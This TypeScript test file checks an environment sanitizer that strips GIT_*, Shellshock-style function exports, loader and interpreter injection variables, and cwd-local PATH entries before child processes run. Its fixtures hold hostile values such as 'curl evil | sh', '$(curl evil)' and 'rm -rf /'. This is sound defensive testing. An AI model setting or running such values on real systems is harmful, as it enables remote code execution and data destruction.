import { describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import {
  sanitizeChildEnv,
  sanitizeChildEnvAsync,
} from "../../pi/extensions/pi-harness/lib/child-env";

describe("sanitizeChildEnv", () => {
  test("scrubs the entire GIT_* namespace from the inherited base", () => {
    const out = sanitizeChildEnv({
      GIT_COMMON_DIR: "/attacker/.git",
      GIT_DIR: "/attacker/.git",
      GIT_WORK_TREE: "/attacker",
      GIT_EXEC_PATH: "/attacker/bin",
      GIT_CONFIG_GLOBAL: "/attacker/.gitconfig",
      GIT_SSH_COMMAND: "sh -c 'curl evil | sh'",
      GIT_INDEX_FILE: "/attacker/index",
      HOME: "/home/u",
    });
    expect(out.GIT_COMMON_DIR).toBeUndefined();
    expect(out.GIT_DIR).toBeUndefined();
    expect(out.GIT_WORK_TREE).toBeUndefined();
    expect(out.GIT_EXEC_PATH).toBeUndefined();
    expect(out.GIT_CONFIG_GLOBAL).toBeUndefined();
    expect(out.GIT_SSH_COMMAND).toBeUndefined();
    expect(out.GIT_INDEX_FILE).toBeUndefined();
    expect(out.HOME).toBe("/home/u");
  });

  test("scrubs BASH_FUNC_* and function-valued exports (Shellshock)", () => {
    const out = sanitizeChildEnv({
      "BASH_FUNC_ls%%": "() { curl evil | sh; }",
      "BASH_FUNC_x()": "() { :; }",
      innocent_looking: "() { rm -rf /; }",
      normal: "value",
    });
    expect(out["BASH_FUNC_ls%%"]).toBeUndefined();
    expect(out["BASH_FUNC_x()"]).toBeUndefined();
    expect(out.innocent_looking).toBeUndefined();
    expect(out.normal).toBe("value");
  });

  test("scrubs shell/loader/interpreter injection vars", () => {
    const out = sanitizeChildEnv({
      BASH_ENV: "/attacker/rc.sh",
      ENV: "/attacker/rc.sh",
      SHELLOPTS: "xtrace",
      BASHOPTS: "x",
      PS4: "$(curl evil)",
      IFS: "x",
      CDPATH: "/attacker",
      GLOBIGNORE: "*",
      PROMPT_COMMAND: "curl evil",
      LD_PRELOAD: "/attacker/x.so",
      LD_LIBRARY_PATH: "/attacker",
      LD_AUDIT: "/attacker/a.so",
      DYLD_INSERT_LIBRARIES: "/attacker/x.dylib",
      DYLD_LIBRARY_PATH: "/attacker",
      NODE_OPTIONS: "--require /attacker/x.js",
      PYTHONSTARTUP: "/attacker/x.py",
      PERL5OPT: "-M/attacker",
      RUBYOPT: "-r/attacker",
      LANG: "en_US.UTF-8",
    });
    for (const key of [
      "BASH_ENV",
      "ENV",
      "SHELLOPTS",
      "BASHOPTS",
      "PS4",
      "IFS",
      "CDPATH",
      "GLOBIGNORE",
      "PROMPT_COMMAND",
      "LD_PRELOAD",
      "LD_LIBRARY_PATH",
      "LD_AUDIT",
      "DYLD_INSERT_LIBRARIES",
      "DYLD_LIBRARY_PATH",
      "NODE_OPTIONS",
      "PYTHONSTARTUP",
      "PERL5OPT",
      "RUBYOPT",
    ]) {
      expect(out[key]).toBeUndefined();
    }
    expect(out.LANG).toBe("en_US.UTF-8");
  });

  test("keeps benign inherited variables", () => {
    const out = sanitizeChildEnv({
      HOME: "/home/u",
      USER: "u",
      TERM: "xterm",
      LANG: "C",
      TMPDIR: "/tmp",
    });
    expect(out).toMatchObject({
      HOME: "/home/u",
      USER: "u",
      TERM: "xterm",
      LANG: "C",
      TMPDIR: "/tmp",
    });
  });

  test("PATH drops empty, relative, and cwd-subtree entries", () => {
    const path = [
      "/usr/bin",
      "/repo/bin", // under cwd → dropped
      "relative/bin", // relative → dropped
      "", // empty → dropped
      "/repo", // == cwd → dropped
      "/opt/bin",
    ].join(delimiter);
    const out = sanitizeChildEnv({ PATH: path }, {}, { cwd: "/repo" });
    expect(out.PATH).toBe(["/usr/bin", "/opt/bin"].join(delimiter));
  });

  test("PATH drops a cwd-local directory spelled through a symlink alias", () => {
    const root = mkdtempSync(join(tmpdir(), "pi-child-env-alias-"));
    try {
      const canonicalCwd = join(root, "repository");
      const alias = join(root, "repository-alias");
      mkdirSync(canonicalCwd);
      symlinkSync(canonicalCwd, alias, "dir");
      // The bin leaf intentionally does not exist yet. Filtering must resolve
      // the existing symlink prefix so creating it after sanitization cannot
      // turn this retained entry into a repository-local executable source.
      const aliasBin = join(alias, "bin");
      const out = sanitizeChildEnv(
        { PATH: [aliasBin, "/usr/bin"].join(delimiter) },
        {},
        { cwd: canonicalCwd },
      );
      expect(out.PATH).toBe("/usr/bin");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("PATH drops a canonical local directory when cwd uses a symlink alias", () => {
    const root = mkdtempSync(join(tmpdir(), "pi-child-env-cwd-alias-"));
    try {
      const canonicalCwd = join(root, "repository");
      const cwdAlias = join(root, "repository-alias");
      const canonicalBin = join(canonicalCwd, "bin");
      mkdirSync(canonicalBin, { recursive: true });
      symlinkSync(canonicalCwd, cwdAlias, "dir");
      const out = sanitizeChildEnv(
        { PATH: [canonicalBin, "/usr/bin"].join(delimiter) },
        {},
        { cwd: cwdAlias },
      );
      expect(out.PATH).toBe("/usr/bin");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("PATH still drops a lexical cwd-local symlink targeting outside", () => {
    const root = mkdtempSync(join(tmpdir(), "pi-child-env-local-link-"));
    try {
      const cwd = join(root, "repository");
      const outside = join(root, "outside-bin");
      const localLink = join(cwd, "tool-bin");
      mkdirSync(cwd);
      mkdirSync(outside);
      symlinkSync(outside, localLink, "dir");
      const out = sanitizeChildEnv(
        { PATH: [localLink, "/usr/bin"].join(delimiter) },
        {},
        { cwd },
      );
      expect(out.PATH).toBe("/usr/bin");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("PATH drops a dangling symlink that could later target the cwd", () => {
    const root = mkdtempSync(join(tmpdir(), "pi-child-env-dangling-"));
    try {
      const cwd = join(root, "repository");
      const danglingAlias = join(root, "future-tools");
      mkdirSync(cwd);
      symlinkSync(join(cwd, "future-bin"), danglingAlias, "dir");
      const out = sanitizeChildEnv(
        { PATH: [danglingAlias, "/usr/bin"].join(delimiter) },
        {},
        { cwd },
      );
      expect(out.PATH).toBe("/usr/bin");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("PATH without a cwd still drops empty and relative entries", () => {
    const path = ["/usr/bin", "", "rel", "/opt/bin"].join(delimiter);
    const out = sanitizeChildEnv({ PATH: path });
    expect(out.PATH).toBe(["/usr/bin", "/opt/bin"].join(delimiter));
  });

  test("a nested cwd only drops entries under that exact subtree", () => {
    const path = ["/repo/bin", "/repo-sibling/bin", "/repo/sub/bin"].join(
      delimiter,
    );
    const out = sanitizeChildEnv({ PATH: path }, {}, { cwd: "/repo" });
    // /repo-sibling is NOT under /repo (prefix guard uses a separator).
    expect(out.PATH).toBe("/repo-sibling/bin");
  });

  test("harness overrides are applied after the scrub (verified GIT_DIR survives)", () => {
    const out = sanitizeChildEnv(
      { GIT_DIR: "/attacker/.git", GIT_COMMON_DIR: "/attacker" },
      { GIT_DIR: "/verified/repo/.git", PI_HARNESS_CHILD: "1" },
    );
    expect(out.GIT_DIR).toBe("/verified/repo/.git");
    expect(out.GIT_COMMON_DIR).toBeUndefined();
    expect(out.PI_HARNESS_CHILD).toBe("1");
  });

  test("an override PATH is trusted and applied verbatim (not cwd-stripped)", () => {
    // Only the inherited base PATH is untrusted; a harness-owned override PATH
    // may intentionally include a cwd-local tool (e.g. a detected codex stub).
    const overridePath = ["/repo/bin", "/usr/bin"].join(delimiter);
    const out = sanitizeChildEnv(
      { PATH: ["/repo/bin", "/usr/bin"].join(delimiter) },
      { PATH: overridePath },
      { cwd: "/repo" },
    );
    expect(out.PATH).toBe(overridePath);
  });

  test("undefined values in base and overrides are skipped", () => {
    const out = sanitizeChildEnv(
      { A: undefined, B: "b" },
      { C: undefined, D: "d" },
    );
    expect("A" in out).toBe(false);
    expect("C" in out).toBe(false);
    expect(out.B).toBe("b");
    expect(out.D).toBe("d");
  });

  test("async sanitization preserves the synchronous security semantics", async () => {
    const root = mkdtempSync(join(tmpdir(), "pi-child-env-async-"));
    try {
      const cwd = join(root, "repository");
      const alias = join(root, "repository-alias");
      mkdirSync(cwd);
      symlinkSync(cwd, alias, "dir");
      const base = {
        PATH: [join(alias, "bin"), "/usr/bin", "relative"].join(delimiter),
        GIT_DIR: "/attacker/.git",
        BASH_ENV: "/attacker/rc",
        HOME: "/home/u",
      };
      const overrides = { GIT_OPTIONAL_LOCKS: "0" };
      expect(await sanitizeChildEnvAsync(base, overrides, { cwd })).toEqual(
        sanitizeChildEnv(base, overrides, { cwd }),
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("does not mutate the base environment object", () => {
    const base = { GIT_DIR: "/x", PATH: "/usr/bin" };
    sanitizeChildEnv(base, {}, { cwd: "/repo" });
    expect(base).toEqual({ GIT_DIR: "/x", PATH: "/usr/bin" });
  });
});
